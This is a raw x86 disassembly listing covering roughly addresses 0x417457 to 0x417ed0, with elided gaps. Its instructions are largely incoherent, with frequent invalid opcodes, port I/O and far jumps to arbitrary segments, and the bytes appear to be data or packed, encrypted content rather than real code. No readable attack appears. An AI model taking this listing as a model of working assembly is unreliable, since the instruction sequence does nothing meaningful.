  417457:	call   0x4338:0x315f3f64
  41745e:	aam    0x8d
  417460:	add    BYTE PTR [ecx],0xea
  417463:	sbb    eax,0x294cde1b
  417468:	mov    ds:0x5781568a,eax
  41746d:	out    0x7f,eax
  41746f:	sub    cl,dh
  417471:	dec    eax
  417472:	orps   xmm5,XMMWORD PTR [edi]
  417475:	push   ss
  417476:	std    
  417477:	mov    ss,WORD PTR [esi]
  417479:	int3   
  41747a:	push   ecx
  41747b:	dec    edi
  41747c:	dec    ebx
  41747d:	xchg   esi,eax
  41747e:	out    0x34,eax
  417480:	mov    WORD PTR [ebx-0x604576f5],es
  417486:	out    dx,eax
  417487:	dec    ebp
  417488:	fist   DWORD PTR [esi+0x25c77155]
  41748e:	inc    esi
  41748f:	fsubr  QWORD PTR [edi+ecx*2-0x79711db5]
  417496:	jmp    0x80bb:0x9ce5517a
  41749d:	(bad)  
  41749e:	cmp    al,0x5
  4174a0:	ins    DWORD PTR es:[edi],dx
  4174a1:	rcr    DWORD PTR [esi],cl
  4174a3:	loopne 0x417483
  4174a5:	nop
  4174a6:	adc    ebp,ebx
  4174a8:	sub    ch,BYTE PTR [eax+0x5c]
  4174ab:	sub    esp,ecx
  4174ad:	push   0x5e
  4174af:	dec    esi
  4174b0:	sub    al,0x97
  4174b2:	ret    0xe4c1
  4174b5:	jg     0x41743c
  4174b7:	xchg   ecx,eax
  4174b8:	cwde   
  4174b9:	(bad)  
  4174ba:	sub    eax,0xed46beb1
  4174bf:	fld    TBYTE PTR [eax+edi*4+0x2975c36c]
  4174c6:	test   eax,0xa974ff5d
  4174cb:	fcom   st(6)
  4174cd:	cmp    cl,al
  4174cf:	xor    eax,0xcdd74f5c
  4174d4:	sub    al,0x6d
  4174d6:	bound  edi,QWORD PTR [esi-0x3c94c7d0]
  4174dc:	retf   
  4174dd:	push   ebp
  4174de:	or     BYTE PTR [ebx],bl
  4174e0:	sbb    dh,BYTE PTR [eax+0x72]
  4174e3:	pop    esp
  4174e4:	inc    esi
  4174e5:	(bad)  [edi]
  4174e7:	ins    DWORD PTR es:[edi],dx
  4174e8:	sub    dl,BYTE PTR [edx]
  4174ea:	fdiv   DWORD PTR [eax+0x7f]
	...
  417555:	add    BYTE PTR [ecx+0x6b0c6aba],dl
  41755b:	fdivr  st(7),st
  41755d:	mov    edi,0x212a686b
  417562:	mov    gs,WORD PTR [esi-0x4bca92c]
  417568:	add    BYTE PTR [eax],al
  41756a:	inc    DWORD PTR [eax]
  41756c:	add    BYTE PTR [eax],al
  41756e:	dec    edi
  41756f:	in     eax,0x93
  417571:	fidivr DWORD PTR [esi+0x38a82b7d]
  417577:	mov    cs,WORD PTR [edi+eiz*4+0x9]
  41757b:	shr    BYTE PTR [edx-0x3d78af7f],cl
  417581:	je     0x4175a2
  417583:	jle    0x4175ec
  417585:	xchg   edi,eax
  417586:	pop    edx
  417587:	int3   
  417588:	std    
  417589:	mov    cl,0xc4
  41758b:	sub    BYTE PTR [ecx],dh
  41758d:	cmp    dl,BYTE PTR [esi-0x3d]
  417590:	les    ebx,FWORD PTR [esi]
  417592:	pop    esi
  417593:	add    ebx,edx
  417595:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417596:	jmp    0x33f:0x1a3a69e9
  41759d:	and    eax,0xaa943c26
  4175a2:	cli    
  4175a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4175a4:	mov    cl,0xca
  4175a6:	mov    ds:0x7b931c01,eax
  4175ab:	fs sub al,0x21
  4175ae:	popf   
  4175af:	addr16 cmc 
  4175b1:	outs   dx,BYTE PTR ds:[esi]
  4175b2:	push   edi
  4175b3:	test   DWORD PTR [ecx],eax
  4175b5:	xor    eax,0x76347f20
  4175ba:	push   ds
  4175bb:	or     eax,0xf83c18
  4175c0:	out    0xaf,al
  4175c2:	add    DWORD PTR [esp+edx*1+0x31ea7628],0xe6d9de89
  4175cd:	test   ebx,esi
  4175cf:	jbe    0x4175c9
  4175d1:	sbb    ah,BYTE PTR [ebx+0x40774ff5]
  4175d7:	mov    esp,0x2a87d3e7
  4175dc:	or     BYTE PTR [esi+0x6beefa17],bh
  4175e2:	sbb    al,cl
  4175e4:	icebp  
  4175e5:	inc    esp
  4175e6:	pop    esi
  4175e7:	iret   
  4175e8:	push   es
  4175e9:	xchg   esp,eax
  4175ea:	push   eax
  4175eb:	mov    cl,dh
  4175ed:	jae    0x41758f
  4175ef:	iret   
  4175f0:	jp     0x41760a
  4175f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4175f3:	inc    edi
  4175f4:	push   es
  4175f5:	hlt    
  4175f6:	sahf   
  4175f7:	adc    DWORD PTR [eax-0x3c],esp
  4175fa:	mov    dh,0xc5
  4175fc:	ss xor ebp,0x18
  417600:	(bad)  
  417601:	jle    0x4175ea
  417603:	mov    ds:0x18b9a529,al
  417608:	mov    cl,0x85
  41760a:	test   eax,ecx
  41760c:	into   
  41760d:	test   al,0x30
  41760f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417610:	mov    dh,0x7d
  417612:	rol    cl,1
  417614:	aaa    
  417615:	push   DWORD PTR es:[ecx-0x1f0db6ea]
  41761c:	inc    esp
  41761d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41761e:	cmp    al,0x66
  417620:	pop    esi
  417621:	push   ds
  417622:	fisubr WORD PTR [esi-0x1adc3b12]
  417628:	add    ebp,DWORD PTR [ecx-0x383d6ea7]
  41762e:	fcmove st,st(1)
  417630:	into   
  417631:	jecxz  0x4176a1
  417633:	ret    
  417634:	fld    DWORD PTR [ebx+0x56]
  417637:	out    0x47,eax
  417639:	jmp    0x20a0:0xbc0c74f3
  417640:	mov    cs,WORD PTR [ebp-0x20]
  417643:	in     al,dx
  417644:	(bad)  
  417645:	leave  
  417646:	sbb    DWORD PTR [eax],esp
  417648:	mov    bh,ah
  41764a:	inc    ebx
  41764b:	mov    esp,0x8f02371e
  417650:	popf   
  417651:	je     0x4176ad
  417653:	adc    al,0x1b
  417655:	test   BYTE PTR [ebx+0x1a],bh
  417658:	aas    
  417659:	dec    ebx
  41765a:	in     eax,0x2a
  41765c:	add    eax,0xc567a988
  417661:	and    BYTE PTR [edx],bh
  417663:	push   esp
  417664:	dec    eax
  417665:	xor    DWORD PTR [edx+0x66d6a807],edi
  41766b:	dec    eax
  41766c:	xor    DWORD PTR [eax],eax
	...
  4176d6:	test   eax,0xdf4fd367
  4176db:	(bad)  
  4176dc:	mov    ebp,0x411f24e7
  4176e1:	fiadd  DWORD PTR [edi+0x422726ff]
  4176e7:	cld    
  4176e8:	add    BYTE PTR [eax],al
  4176ea:	inc    DWORD PTR [eax]
  4176ec:	add    BYTE PTR [eax],al
  4176ee:	fwait
  4176ef:	mov    al,0x98
  4176f1:	mov    BYTE PTR [ebp-0x34b3906],ah
  4176f7:	mov    al,BYTE PTR [edi+edx*8]
  4176fa:	pop    es
  4176fb:	rol    DWORD PTR [esi-0x36],1
  4176fe:	loopne 0x4176eb
  417700:	(bad)  
  417701:	sahf   
  417702:	repz dec edx
  417704:	push   edi
  417705:	test   BYTE PTR ds:0xdcbb5826,dh
  41770b:	and    eax,0x880ee4ef
  417710:	cmp    bh,ah
  417712:	mov    ?,WORD PTR ds:0x281f3c57
  417718:	inc    esp
  417719:	xor    bh,BYTE PTR [edx+0x72]
  41771c:	inc    eax
  41771d:	push   eax
  41771e:	sub    al,0x5f
  417720:	nop
  417721:	out    0x43,al
  417723:	or     edx,DWORD PTR [edi+0x3a]
  417726:	retf   
  417727:	ret    0x39c6
  41772a:	aam    0xea
  41772c:	mov    ds:0x96e91cb2,al
  417731:	call   0xc4ba02eb
  417736:	push   cs
  417737:	push   ss
  417738:	jns    0x4176ed
  41773a:	(bad)  
  41773b:	(bad)  
  41773c:	pop    ecx
  41773d:	mov    ds:0x95de198f,al
  417742:	push   0xffffffe3
  417744:	adc    eax,0x3e5aa819
  417749:	stos   BYTE PTR es:[edi],al
  41774a:	fmul   DWORD PTR [ebx]
  41774c:	pop    ebx
  41774d:	retf   
  41774e:	push   ebp
  41774f:	mov    bl,0x59
  417751:	sub    al,bh
  417753:	push   cs
  417754:	sti    
  417755:	(bad)  
  417756:	sar    dl,cl
  417758:	sahf   
  417759:	jp     0x41772f
  41775b:	addr16 pop es
  41775d:	daa    
  41775e:	push   cs
  41775f:	pushf  
  417760:	shr    DWORD PTR [edx-0x3f4ebad5],cl
  417766:	push   ss
  417767:	clc    
  417768:	lods   eax,DWORD PTR ds:[esi]
  417769:	mov    ah,0xe8
  41776b:	cmp    al,0x37
  41776d:	int3   
  41776e:	cdq    
  41776f:	pop    es
  417770:	dec    eax
  417771:	mov    ah,0x56
  417773:	call   0x9f0a:0xcd47f17e
  41777a:	xchg   ebp,eax
  41777b:	push   ebp
  41777c:	mov    bh,0xd8
  41777e:	fsubr  QWORD PTR [edi-0x47365bc1]
  417784:	jmp    0x1f2b:0x7da92b3a
  41778b:	repz das 
  41778d:	lods   al,BYTE PTR ds:[esi]
  41778e:	(bad)
  417791:	loope  0x41777e
  417793:	out    0x81,eax
  417795:	push   ecx
  417796:	dec    esi
  417797:	dec    esp
  417798:	imul   DWORD PTR [edi-0x14c6d75c]
  41779e:	outs   dx,BYTE PTR ds:[esi]
  41779f:	xor    al,0x17
  4177a1:	ins    DWORD PTR es:[edi],dx
  4177a2:	push   ss
  4177a3:	adc    esp,DWORD PTR [eax]
  4177a5:	scas   eax,DWORD PTR es:[edi]
  4177a6:	ins    DWORD PTR es:[edi],dx
  4177a7:	mov    al,ds:0xc28fd010
  4177ac:	leave  
  4177ad:	popf   
  4177ae:	jns    0x4177bd
  4177b0:	inc    eax
  4177b1:	dec    ebx
  4177b2:	inc    edx
  4177b3:	lds    esp,FWORD PTR [esi]
  4177b5:	std    
  4177b6:	rol    edx,0xb3
  4177b9:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  4177bb:	pusha  
  4177bc:	imul   eax,DWORD PTR [ecx-0x49],0xffffff91
  4177c0:	pusha  
  4177c1:	add    eax,0x5da5d7a8
  4177c6:	mov    al,ds:0x33c02e43
  4177cb:	cmp    al,0x5f
  4177cd:	pop    edi
  4177ce:	loopne 0x417792
  4177d0:	xchg   edx,eax
  4177d1:	int    0x88
  4177d3:	push   ss
  4177d4:	hlt    
  4177d5:	rcr    bh,1
  4177d7:	in     eax,dx
  4177d8:	ja     0x41776f
  4177da:	sbb    eax,DWORD PTR [ecx+ebp*2]
  4177dd:	adc    esi,ecx
  4177df:	shl    ebx,0x5f
  4177e2:	sub    DWORD PTR [esi-0x6dd30d7c],0xffffffe7
  4177e9:	mov    edx,0xa4817f
	...
  417856:	jmp    0xff597669
  41785b:	imul   ecx
  41785d:	(bad)  
  41785e:	lahf   
  41785f:	repnz and dl,dl
  417862:	lea    eax,[edx-0x2bef0bb]
  417868:	add    BYTE PTR [eax],al
  41786a:	inc    DWORD PTR [eax]
  41786c:	add    BYTE PTR [eax],al
  41786e:	addr16 xchg esp,eax
  417870:	dec    ebp
  417871:	repz dec ecx
  417873:	dec    ecx
  417874:	add    cl,BYTE PTR [ecx]
  417876:	jp     0x417861
  417878:	or     DWORD PTR gs:[esi+0x78],ecx
  41787c:	fbld   TBYTE PTR [eax]
  41787e:	or     ax,0xccba
  417882:	jno    0x41783d
  417884:	mov    ds:0x7b8dd091,al
  417889:	pusha  
  41788a:	int    0xc2
  41788c:	in     al,dx
  41788d:	xor    eax,0x1fe82192
  417892:	mov    bl,0x14
  417894:	inc    ebp
  417895:	imul   DWORD PTR [edi+0x25f47eac]
  41789b:	mov    dh,0x35
  41789d:	iret   
  41789e:	fucomp st(6)
  4178a0:	adc    eax,0xba9929c0
  4178a5:	scas   al,BYTE PTR es:[edi]
  4178a6:	sbb    bl,dh
  4178a8:	jecxz  0x417887
  4178aa:	adc    ebx,esi
  4178ac:	xchg   esp,eax
  4178ad:	push   eax
  4178ae:	push   0x81a4484b
  4178b3:	jmp    0x86b5c029
  4178b8:	ret    
  4178b9:	test   al,0x85
  4178bb:	(bad)  
  4178bc:	fs fwait
  4178be:	sub    bl,BYTE PTR [ebx+0x22]
  4178c1:	xlat   BYTE PTR ds:[ebx]
  4178c2:	int3   
  4178c3:	fs dec edx
  4178c5:	sbb    BYTE PTR [edx+0x53128b0],bl
  4178cb:	pop    esp
  4178cc:	cmp    DWORD PTR [edx-0x9],esp
  4178cf:	add    dh,ch
  4178d1:	ficom  DWORD PTR [edx+0x63]
  4178d4:	aas    
  4178d5:	xchg   edi,eax
  4178d6:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  4178d8:	(bad)  
  4178d9:	in     al,dx
  4178da:	xlat   BYTE PTR ds:[ebx]
  4178db:	call   0xe5632dde
  4178e0:	push   0x71
  4178e2:	and    eax,0x9707a8c4
  4178e7:	sub    ch,0xcc
  4178ea:	test   BYTE PTR [esi-0x47ba9b3f],al
  4178f0:	test   DWORD PTR [edi],esi
  4178f2:	clc    
  4178f3:	lahf   
  4178f4:	jo     0x41789f
  4178f6:	sub    DWORD PTR ds:0xb84740d7,edi
  4178fc:	mov    dl,BYTE PTR [ecx-0x76]
  4178ff:	popf   
  417900:	push   ecx
  417901:	sbb    edi,DWORD PTR [esi]
  417903:	jmp    0x417900
  417905:	mov    ch,0xe2
  417907:	push   0xffffff96
  417909:	test   eax,0x65e7c996
  41790e:	retf   0x8cab
  417911:	test   BYTE PTR [eax],ch
  417913:	and    esp,DWORD PTR [edx]
  417915:	mov    esp,0x93083300
  41791a:	ret    0x71be
  41791d:	lea    edx,[ebp+0x71223397]
  417923:	dec    edi
  417924:	and    ecx,DWORD PTR [edi-0x7d394b2d]
  41792a:	fmul   QWORD PTR [eax]
  41792c:	dec    edx
  41792d:	pop    eax
  41792e:	arpl   WORD PTR [eax],ax
  417930:	out    dx,eax
  417931:	pop    edi
  417932:	sar    BYTE PTR [ebp-0x353d6148],cl
  417938:	dec    esp
  417939:	dec    edx
  41793a:	not    DWORD PTR [ebx+0x13]
  41793d:	sbb    bh,0x67
  417940:	enter  0x3a50,0x20
  417944:	xchg   edx,eax
  417945:	lods   al,BYTE PTR ds:[esi]
  417946:	retf   0xa529
  417949:	int    0xe
  41794b:	push   edi
  41794c:	out    0x22,eax
  41794e:	cmp    ebp,DWORD PTR [edx+0x62]
  417951:	neg    dl
  417953:	push   ebx
  417954:	mov    WORD PTR es:[edi-0x30b1b1de],?
  41795b:	and    edx,DWORD PTR [eax+eiz*4+0x3]
  41795f:	iret   
  417960:	mov    bh,0x66
  417962:	and    BYTE PTR [edx+0x5a],ah
  417965:	add    bh,bh
  417967:	nop
  417968:	mov    ds:0x38bfce1c,eax
	...
  4179d5:	add    BYTE PTR [eax+0x41],bl
  4179d8:	pop    ds
  4179d9:	lods   eax,DWORD PTR ds:[esi]
  4179da:	pop    ds
  4179db:	(bad)  
  4179dc:	cli    
  4179dd:	cmc    
  4179de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4179df:	retf   0xe5d4
  4179e2:	(bad)  
  4179e3:	test   DWORD PTR [ebx+ebp*4+0xfe40],0xff
  4179ee:	add    al,0xca
  4179f0:	int3   
  4179f1:	jecxz  0x417a21
  4179f3:	adc    al,BYTE PTR [esi+0x455e9697]
  4179f9:	cmp    al,0x11
  4179fb:	(bad)  
  4179fc:	std    
  4179fd:	mov    al,0x22
  4179ff:	aad    0xe1
  417a01:	gs adc al,0xbe
  417a04:	(bad)  
  417a06:	shl    DWORD PTR [ebp+edi*1-0x27cfd7ee],1
  417a0d:	shr    BYTE PTR [esi],1
  417a0f:	xchg   DWORD PTR [eax+esi*2-0x73f74f52],ecx
  417a16:	cmc    
  417a17:	mov    ds:0xb75859c0,al
  417a1c:	jns    0x417a80
  417a1e:	stc    
  417a1f:	fbld   TBYTE PTR [ebp-0x40e0507a]
  417a25:	shl    BYTE PTR [edx],0xa6
  417a28:	adc    esi,DWORD PTR [ebx+0x121f115e]
  417a2e:	jge    0x417a47
  417a30:	(bad)  
  417a31:	out    dx,eax
  417a32:	ret    0xfe50
  417a35:	pop    eax
  417a36:	fsubr  QWORD PTR ss:[ebx+0x4c41b6e2]
  417a3d:	and    BYTE PTR [edx+0x11],ch
  417a40:	retf   
  417a41:	dec    edi
  417a42:	fisub  WORD PTR fs:[eax+0x70]
  417a46:	cmc    
  417a47:	in     eax,dx
  417a48:	mov    BYTE PTR [edx+0x443e02d4],bh
  417a4e:	xchg   ebx,eax
  417a4f:	lahf   
  417a50:	lahf   
  417a51:	call   0x6490:0x293cf089
  417a58:	jo     0x4179e8
  417a5a:	sub    BYTE PTR [esi],ch
  417a5c:	mov    dh,0x74
  417a5e:	aam    0xfe
  417a60:	(bad)  
  417a61:	dec    esi
  417a62:	or     BYTE PTR [ecx],bl
  417a64:	fwait
  417a65:	dec    edx
  417a66:	fisttp WORD PTR [esp+esi*8+0x3d]
  417a6a:	dec    eax
  417a6b:	or     DWORD PTR [edi+0x5f8fb2b9],ecx
  417a71:	xor    esi,DWORD PTR [edi+0x72644e0e]
  417a77:	int3   
  417a78:	cmc    
  417a79:	ror    ebx,cl
  417a7b:	push   ds
  417a7c:	cdq    
  417a7d:	jbe    0x417ad7
  417a7f:	outs   dx,DWORD PTR ds:[esi]
  417a80:	test   BYTE PTR [ecx+0x4e08c01e],0x27
  417a87:	inc    ebp
  417a88:	ret    
  417a89:	xchg   BYTE PTR [edx+0x73d2d388],cl
  417a8f:	pusha  
  417a90:	mov    edi,0x95091213
  417a95:	mov    bl,0x16
  417a97:	add    ebp,DWORD PTR [edi+0x17afb185]
  417a9d:	stos   DWORD PTR es:[edi],eax
  417a9e:	outs   dx,DWORD PTR ds:[esi]
  417a9f:	jne    0x417b11
  417aa1:	or     al,0xc2
  417aa3:	addr16 or al,0xac
  417aa6:	jmp    0x4dd702a0
  417aab:	std    
  417aac:	push   esi
  417aad:	mov    esp,0x99984af6
  417ab2:	clc    
  417ab3:	ret    
  417ab4:	lahf   
  417ab5:	loopne 0x417ac3
  417ab7:	push   ecx
  417ab8:	outs   dx,BYTE PTR ds:[esi]
  417ab9:	je     0x417a60
  417abb:	ss xchg ebp,eax
  417abd:	cmp    al,0x9
  417abf:	shl    edx,cl
  417ac1:	sub    ecx,esi
  417ac3:	jne    0x417b23
  417ac5:	dec    esi
  417ac6:	outs   dx,DWORD PTR ds:[esi]
  417ac7:	add    al,0x6c
  417ac9:	ror    DWORD PTR [esi-0x32],0xf6
  417acd:	dec    edi
  417ace:	pop    edx
  417acf:	ja     0x417b19
  417ad1:	jmp    0xfdb2:0xf87f5305
  417ad8:	push   cs
  417ad9:	mov    eax,ds:0x7a70ceaa
  417ade:	fistp  QWORD PTR [ebp-0x4c]
  417ae1:	int3   
  417ae2:	inc    esi
  417ae3:	sahf   
  417ae4:	mov    esi,0x540e33f9
  417ae9:	mov    ah,0x23
  417aeb:	dec    ebp
  417aec:	push   ds
	...
  417b55:	add    BYTE PTR [edi],ch
  417b57:	stos   DWORD PTR es:[edi],eax
  417b58:	cdq    
  417b59:	inc    ecx
  417b5a:	popf   
  417b5b:	jae    0x417b5c
  417b5d:	out    dx,eax
  417b5e:	(bad)  [eax]
  417b60:	xor    ebx,DWORD PTR [ecx-0x2b75b8c9]
  417b66:	aas    
  417b67:	inc    DWORD PTR [eax]
  417b69:	add    bh,bh
  417b6b:	add    BYTE PTR [eax],al
  417b6d:	add    BYTE PTR [ebx-0x523e2e07],al
  417b73:	pop    es
  417b74:	cmp    eax,0xe77c215f
  417b79:	sbb    al,BYTE PTR [ecx+0x4d]
  417b7c:	xchg   esp,eax
  417b7d:	stos   BYTE PTR es:[edi],al
  417b7e:	fwait
  417b7f:	(bad)  
  417b80:	stc    
  417b81:	scas   eax,DWORD PTR es:[edi]
  417b82:	pop    esi
  417b83:	cmc    
  417b84:	mov    dh,dh
  417b86:	add    eax,0xb3e9d62a
  417b8b:	mov    ds:0x24bc52ae,eax
  417b90:	jo     0x417b39
  417b92:	pop    esi
  417b93:	arpl   WORD PTR [edx+0x16],dx
  417b96:	test   al,0xcb
  417b98:	sub    BYTE PTR [ebx],0x15
  417b9b:	popf   
  417b9c:	dec    esi
  417b9d:	ins    BYTE PTR es:[edi],dx
  417b9e:	adc    DWORD PTR [esi+0x0],0x98926c6c
  417ba5:	or     ah,dh
  417ba7:	cmp    al,cl
  417ba9:	and    BYTE PTR [eax-0x4bbfa715],0x27
  417bb0:	cdq    
  417bb1:	sub    al,0xb4
  417bb3:	sub    DWORD PTR [ebp+0x6dbe308c],ecx
  417bb9:	mov    ds:0x14326249,al
  417bbe:	ins    DWORD PTR es:[edi],dx
  417bbf:	out    dx,al
  417bc0:	in     eax,dx
  417bc1:	dec    eax
  417bc2:	idiv   bl
  417bc4:	sub    al,0x6a
  417bc6:	(bad)  
  417bc7:	and    al,ch
  417bc9:	popa   
  417bca:	stc    
  417bcb:	pop    esp
  417bcc:	add    ecx,ebp
  417bce:	pusha  
  417bcf:	(bad)  
  417bd1:	dec    ebx
  417bd2:	add    edx,edx
  417bd4:	dec    edi
  417bd5:	sbb    ecx,edx
  417bd7:	sub    al,0x1d
  417bd9:	(bad)  
  417bda:	sbb    al,0x72
  417bdc:	cld    
  417bdd:	cmc    
  417bde:	jcxz   0x417b75
  417be1:	stc    
  417be2:	icebp  
  417be3:	cmp    eax,ecx
  417be5:	sbb    DWORD PTR [ecx+0x52],esp
  417be8:	push   esp
  417be9:	shl    BYTE PTR [ebp+0x4c],0xb
  417bed:	pop    ds
  417bee:	bound  ecx,QWORD PTR [ebp+0x1b]
  417bf1:	bound  esi,QWORD PTR [ecx+0x5]
  417bf4:	add    al,0x9e
  417bf6:	mov    bl,0x30
  417bf8:	inc    eax
  417bf9:	cmp    dl,cl
  417bfb:	mov    esi,0x5478ae3a
  417c00:	ret    0x628b
  417c03:	mov    BYTE PTR [esi],cl
  417c05:	push   esi
  417c06:	hlt    
  417c07:	sub    eax,0xae298b08
  417c0c:	shr    DWORD PTR [ebp+0x728994aa],1
  417c12:	push   ds
  417c13:	adc    al,0x51
  417c15:	mov    ?,WORD PTR [edi]
  417c17:	das    
  417c18:	js     0x417bba
  417c1a:	and    edx,DWORD PTR [ebp-0xa]
  417c1d:	xchg   ebp,eax
  417c1e:	and    DWORD PTR [ecx],esi
  417c20:	or     eax,0xe327beff
  417c25:	cmp    al,0x98
  417c27:	in     eax,0x92
  417c29:	loop   0x417ca3
  417c2b:	and    ebp,DWORD PTR [edi+0x4265bbe3]
  417c31:	jecxz  0x417c44
  417c33:	sbb    al,0x92
  417c35:	(bad)  
  417c36:	loope  0x417c13
  417c38:	fwait
  417c39:	ins    BYTE PTR es:[edi],dx
  417c3a:	call   0x195d253
  417c3f:	sbb    eax,DWORD PTR [eax]
  417c41:	fsqrt  
  417c43:	cmp    dl,BYTE PTR [ecx+0x4ec2ee2b]
  417c49:	cli    
  417c4a:	outs   dx,BYTE PTR ds:[esi]
  417c4b:	add    BYTE PTR [ecx-0xa],dh
  417c4e:	cmp    edx,eax
  417c50:	pop    es
  417c51:	pop    edi
  417c52:	cs add edi,esp
  417c55:	lods   al,BYTE PTR ds:[esi]
  417c56:	pushf  
  417c57:	fnstcw WORD PTR [esp+edx*2+0x4a]
  417c5b:	(bad)  
  417c5c:	sub    al,0x4d
  417c5e:	push   0x54d702b
  417c63:	jg     0x417ce0
  417c65:	aad    0x28
  417c67:	neg    BYTE PTR [eax+edi*4-0x36]
  417c6b:	jl     0x417c32
	...
  417cd5:	add    BYTE PTR [ecx-0x267b6f40],cl
  417cdb:	aam    0x9d
  417cdd:	int    0x75
  417cdf:	aaa    
  417ce0:	das    
  417ce1:	aam    0x2d
  417ce3:	lock mov ds:0x1003e72,al
  417ce9:	add    bh,bh
  417ceb:	add    BYTE PTR [eax],al
  417ced:	add    BYTE PTR [esi],bh
  417cef:	gs mov ecx,0x89750ac1
  417cf5:	mov    bh,0xc6
  417cf7:	cli    
  417cf8:	pop    edx
  417cf9:	jge    0x417d06
  417cfb:	shr    BYTE PTR [ebx],1
  417cfd:	sbb    BYTE PTR [edi-0x2d1ffc3f],bh
  417d03:	icebp  
  417d04:	xchg   edi,eax
  417d05:	xor    BYTE PTR [ebx-0x34],bh
  417d08:	arpl   WORD PTR [esi+eax*1-0xbfc2e],bp
  417d0f:	pusha  
  417d10:	inc    ecx
  417d11:	xor    eax,0x4ecee222
  417d16:	or     BYTE PTR [edi],bl
  417d18:	or     DWORD PTR [edx],esp
  417d1a:	sub    BYTE PTR ss:[edx+0x2dbbd983],al
  417d21:	out    0xcf,eax
  417d23:	loop   0x417d2e
  417d25:	in     al,0x9e
  417d27:	sub    BYTE PTR [edx],al
  417d29:	out    0xf,al
  417d2b:	add    al,0x54
  417d2d:	push   es
  417d2e:	outs   dx,BYTE PTR ds:[esi]
  417d2f:	ret    0x32f9
  417d32:	or     al,0xe
  417d34:	in     eax,0xe0
  417d36:	push   ebx
  417d37:	scas   al,BYTE PTR es:[edi]
  417d38:	cmp    ebp,DWORD PTR [eax]
  417d3a:	out    dx,al
  417d3b:	mov    ds:0xb99faaab,al
  417d40:	repnz sub ecx,DWORD PTR ds:0x6bb84b28
  417d47:	repz int3 
  417d49:	in     al,0x98
  417d4b:	mov    eax,0x251194c9
  417d50:	cmp    DWORD PTR [eax-0x1e],esi
  417d53:	pusha  
  417d54:	enter  0xa23d,0xd3
  417d58:	or     cl,BYTE PTR [ebx+ebp*2+0x10]
  417d5c:	(bad)  
  417d5d:	ss mov dh,0xae
  417d60:	cmc    
  417d61:	out    dx,al
  417d62:	dec    esi
  417d63:	mov    al,ds:0xb02c9b2e
  417d68:	cmp    bh,BYTE PTR [ebx]
  417d6a:	loope  0x417dd4
  417d6c:	xlat   BYTE PTR ds:[ebx]
  417d6d:	cmp    eax,0x1d33b0e8
  417d72:	adc    edi,DWORD PTR [esp+edx*4-0x3a]
  417d76:	mov    ebx,ebp
  417d78:	xchg   ebx,eax
  417d79:	mov    BYTE PTR [esi],bl
  417d7b:	int3   
  417d7c:	and    ebx,ecx
  417d7e:	sub    ebx,esp
  417d80:	fisub  WORD PTR [esi-0x67]
  417d83:	(bad)  
  417d84:	nop
  417d85:	imul   ecx,ecx,0xffffffdb
  417d88:	scas   eax,DWORD PTR es:[edi]
  417d89:	shl    DWORD PTR [ecx+esi*2+0x43a351e1],1
  417d90:	lahf   
  417d91:	cmp    cl,BYTE PTR ds:0xb6ad164c
  417d97:	sub    eax,0xa6d8c7d1
  417d9c:	push   es
  417d9d:	jecxz  0x417d77
  417d9f:	jecxz  0x417d57
  417da1:	mov    bl,0x3
  417da3:	push   ebx
  417da4:	mov    esp,0x4f182aee
  417da9:	jb     0x417dd5
  417dab:	jg     0x417de0
  417dad:	std    
  417dae:	add    eax,0x6b5efebb
  417db3:	mov    ds:0x6d6ff10f,eax
  417db8:	pop    ss
  417db9:	pop    di
  417dbb:	add    eax,0x9233e905
  417dc0:	fs pop esi
  417dc2:	stos   BYTE PTR es:[edi],al
  417dc3:	test   BYTE PTR [eax-0x2e],ch
  417dc6:	repz cld 
  417dc8:	dec    eax
  417dc9:	pop    ebx
  417dca:	stc    
  417dcb:	dec    esp
  417dcc:	mov    ds:0xe6b3c915,eax
  417dd1:	mov    bh,0x77
  417dd3:	inc    eax
  417dd4:	icebp  
  417dd5:	mov    ah,0x7
  417dd7:	xchg   DWORD PTR cs:[ebx],esp
  417dda:	mov    eax,0xfafdecf4
  417ddf:	cmp    BYTE PTR [eax-0x6d],bl
  417de2:	enter  0x48fd,0xde
  417de6:	push   edx
  417de7:	mov    cl,0x46
  417de9:	adc    ebx,DWORD PTR [esi-0x23]
  417dec:	add    DWORD PTR [eax],eax
	...
  417e56:	pop    ss
  417e57:	arpl   WORD PTR ds:0x5f7f7d53,bx
  417e5d:	addr16 dec esi
  417e5f:	sub    BYTE PTR [ecx+0x46],ch
  417e62:	lock enter 0x9a27,0x3d
  417e67:	add    DWORD PTR [ecx],eax
  417e69:	add    bh,bh
  417e6b:	add    BYTE PTR [eax],al
  417e6d:	add    bh,bl
  417e6f:	and    eax,DWORD PTR [ebp+0x6d9356e3]
  417e75:	ja     0x417e7b
  417e77:	call   0x325e:0x6706ab18
  417e7e:	mov    al,bl
  417e80:	mov    edi,DWORD PTR [edx-0x45]
  417e83:	mov    eax,0xc7591556
  417e88:	cdq    
  417e89:	sbb    DWORD PTR [edi-0x4e4f8304],ecx
  417e8f:	(bad)  
  417e90:	pshufw mm2,QWORD PTR [ebx+0x35],0x7e
  417e95:	nop
  417e96:	mov    ah,0x3d
  417e98:	mov    WORD PTR [edi+0x6],gs
  417e9b:	cmp    al,0x8
  417e9d:	cmp    DWORD PTR ds:0xf11d1a93,esi
  417ea3:	daa    
  417ea4:	jecxz  0x417f0e
  417ea6:	in     eax,dx
  417ea7:	inc    ebx
  417ea8:	xchg   ebx,eax
  417ea9:	mov    ah,0xbe
  417eab:	jl     0x417e3f
  417ead:	pop    esi
  417eae:	add    ah,dl
  417eb0:	cli    
  417eb1:	push   0xffffff9a
  417eb3:	outs   dx,BYTE PTR ds:[esi]
  417eb4:	pop    ecx
  417eb5:	mov    WORD PTR [esi],gs
  417eb7:	nop
  417eb8:	jp     0x417efb
  417eba:	mov    fs,esi
  417ebc:	ret    0xc799
  417ebf:	pop    ds
  417ec0:	outs   dx,DWORD PTR ds:[esi]
  417ec1:	mov    WORD PTR [ebx],cs
  417ec3:	in     eax,dx
  417ec4:	lods   al,BYTE PTR ds:[esi]
  417ec5:	les    ebp,FWORD PTR [ebp-0x74]
  417ec8:	rol    BYTE PTR [esi+esi*4+0x3f4fef67],0x10
  417ed0:	fwait
